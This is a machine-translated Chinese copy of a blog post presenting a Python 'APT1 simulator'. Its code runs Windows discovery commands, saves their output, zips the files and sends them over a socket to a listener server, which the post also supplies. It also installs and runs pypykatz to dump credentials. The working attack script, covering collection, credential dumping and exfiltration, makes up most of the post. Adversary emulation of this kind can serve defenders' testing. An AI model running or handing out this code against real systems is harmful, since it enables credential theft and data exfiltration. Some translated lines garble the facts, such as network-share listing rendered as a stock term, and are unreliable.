# Python APT1 模拟器

> 原文：<https://infosecwriteups.com/python-apt1-simulator-41df8f4fe655?source=collection_archive---------2----------------------->

![](img/fa1130989e7bc868c4e5862014d1db73.png)

马库斯·斯皮斯克在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上的照片

米特尔 ATT CK 公司关于 APT1 集团的信息如下:

APT1 使用命令 net localgroup、net user 和 net group 在系统上查找帐户。
APT1 已经使用 RAR 压缩文件，然后将它们转移到受害者网络之外。
APT1 使用批处理脚本来执行一系列发现技术，并将其保存到文本文件中。APT1 从一名当地受害者那里收集了一些文件。
APT1 上市互联网络股份。
众所周知，APT1 利用 Mimikatz 进行凭证倾销。
APT1 使用 tasklist /v 收集系统上正在运行的进程列表。
APT1 使用 ipconfig /all 命令收集网络配置信息。
APT1 使用 net use 命令获得网络连接列表。
APT1 使用命令 net start 和 tasklist 获得系统上的服务列表。

[](https://github.com/anil-yelken/APT-Simulator) [## GitHub-Anil-yelken/APT-Simulator:APT 模拟器

### 来自米特 ATT 和 CK 的关于 APT1 小组的测试 Windows 10 信息如下:APT1 使用了命令 net…

github.com](https://github.com/anil-yelken/APT-Simulator) 

现在让我们用 python 解释一下代码。

APT1 使用命令 net localgroup、net user 和 net group 在系统上查找帐户。

```
try:
    localgroup=subprocess.check_output("net localgroup",shell=True)
    with open("localgroup.txt", 'wb') as file:
        file.write(localgroup)
except:
    pass
try:
    user=subprocess.check_output("net user",shell=True)
    with open("user.txt", 'wb') as file:
        file.write(user)
except:
    pass
try:
    group=subprocess.check_output("net group",shell=True)
    with open("group.txt", 'wb') as file:
        file.write(group)
except:
    pass
```

APT1 已经使用 RAR 压缩文件，然后将它们移出受害者网络。

客户:

```
try:
    file_zip = zipfile.ZipFile('file.zip', 'w')
    for folder, subfolders, files in os.walk('.'):
        for file in files:
            if file.endswith('.txt'):
                file_zip.write(os.path.join(folder, file),
                              os.path.relpath(os.path.join(folder, file), '.'),
                              compress_type=zipfile.ZIP_DEFLATED)
    file_zip.close()
    print("Files are compressed.")
    s = socket.socket()
    s.connect(("127.0.0.1", 80))
    with open("file.zip", "rb") as f:
        while True:
            bytes_read = f.read(4096)
            if not bytes_read:
                break
            s.sendall(bytes_read)
    s.close()
    print("Zip file sent.")
except:
    pass
```

服务器:

```
import socket
s = socket.socket()
s.bind(("0.0.0.0", 80))
s.listen()
client_socket, address = s.accept()
print(f"[+] {address} is connected.")
with open("received_file.zip", "wb") as f:
    while True:
        bytes_read = client_socket.recv(4096)
        if not bytes_read:
            break
        f.write(bytes_read)
client_socket.close()
s.close()
```

APT1 上市的互联网络股份。

```
try:
    netuse=subprocess.check_output("net use",shell=True)
    with open("netuse.txt", 'wb') as file:
        file.write(netuse)
except:
    pass
```

众所周知，APT1 使用 Mimikatz 进行凭据转储。

```
try:
    os.system("pip3 install pypykatz")
except:
    pass
try:
    os.system("pypykatz.py rekall dump -t 0")
    print("pypykatz is finished.")
except:
    pass
```

APT1 使用 tasklist /v 收集了系统上正在运行的进程的列表

```
try:
    tasklist=subprocess.check_output("tasklist /v",shell=True)
    with open("tasklist.txt", 'wb') as file:
        file.write(tasklist)
except:
    pass
```

APT1 使用 ipconfig /all 命令收集网络配置信息。

```
try:
    ipconfig=subprocess.check_output("ipconfig /all",shell=True)
    with open("ipconfig.txt", 'wb') as file:
        file.write(ipconfig)
except:
    pass
```

APT1 使用命令 net start 和 tasklist 来获取系统上的服务列表。

```
try:
    netstart=subprocess.check_output("net start",shell=True)
    with open("netstart.txt", 'wb') as file:
        file.write(netstart)
except:
    pass
try:
    tasklist=subprocess.check_output("tasklist /v",shell=True)
    with open("tasklist.txt", 'wb') as file:
        file.write(tasklist)
except:
    pass
```

注:为教育目的而写。

## 来自 Infosec 的报道:Infosec 每天都有很多内容，很难跟上。[加入我们的每周简讯](https://weekly.infosecwriteups.com/)以 5 篇文章、4 个线程、3 个视频、2 个 GitHub Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！